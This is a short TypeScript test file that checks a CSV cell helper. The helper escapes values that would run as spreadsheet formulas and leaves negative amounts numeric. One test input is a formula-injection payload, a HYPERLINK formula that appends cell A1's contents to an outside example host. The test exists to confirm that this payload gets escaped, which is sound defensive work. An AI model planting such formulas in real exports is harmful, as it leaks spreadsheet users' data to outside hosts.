import { expect, test } from "bun:test";
import { csvCell, formulaSafe } from "./csv-cell";

/**
 * The one test every export in every repository escapes with. A contact who
 * calls themselves `=1+1` is text in the spreadsheet; a refund of -500 is
 * still a number the column can add up.
 */
test("a name that is a formula is text, and a negative amount stays a number", () => {
  expect(csvCell("=1+1")).toBe("'=1+1");
  expect(csvCell(-500)).toBe("-500");
  expect(csvCell("-500.00")).toBe("-500.00");
  for (const start of ["=", "+", "-", "@", "\t", "\r"]) {
    expect([start, formulaSafe(`${start}cmd`)]).toEqual([
      start,
      `'${start}cmd`,
    ]);
  }
  // Escaped and then quoted, so the apostrophe sits inside the quotes.
  expect(csvCell('=HYPERLINK("http://elsewhere.example"&A1,"click")')).toBe(
    '"\'=HYPERLINK(""http://elsewhere.example""&A1,""click"")"',
  );
  expect(csvCell(null)).toBe("");
  expect(csvCell("Ellesmere Dental")).toBe("Ellesmere Dental");
});
